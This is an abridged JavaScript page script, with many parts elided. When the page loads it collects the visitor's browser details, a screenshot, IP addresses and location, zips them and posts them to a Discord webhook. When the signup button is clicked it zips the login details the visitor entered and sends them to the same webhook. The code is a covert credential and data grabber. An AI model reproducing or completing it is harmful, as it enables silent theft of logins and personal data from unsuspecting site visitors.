document.addEventListener('DOMContentLoaded', () => {
    ...
    async function sendInitialDataToDiscord(zipBlob, uniqueId) {
        ...
        try {
            ...
            console.log('Initial zip file sent to Discord webhook');
        } catch (error) {
            console.error('Error sending initial zip file to Discord webhook:', error);
        }
    }
    ...
    document.getElementById('signup-button').addEventListener('click', async () => {
        ...
        const loginZip = new JSZip();
        loginZip.file('login.json', JSON.stringify(loginInfo, null, 2));
        const loginBlob = await loginZip.generateAsync({ type: 'blob' });

        const formData = new FormData();
        formData.append('file', loginBlob, `${username}.zip`);
        ...
        try {
            ...
            console.log('Login zip file sent to Discord webhook');
        } catch (error) {
            console.error('Error sending login zip file to Discord webhook:', error);
        }
    });
    ...
    async function initialize() {
        ...
        const zipBlob = await createInitialZipFile(browserInfo, screenshotDataUrl, ipAddresses, ipAddresses.location);
        await sendInitialDataToDiscord(zipBlob, uniqueId);
    }
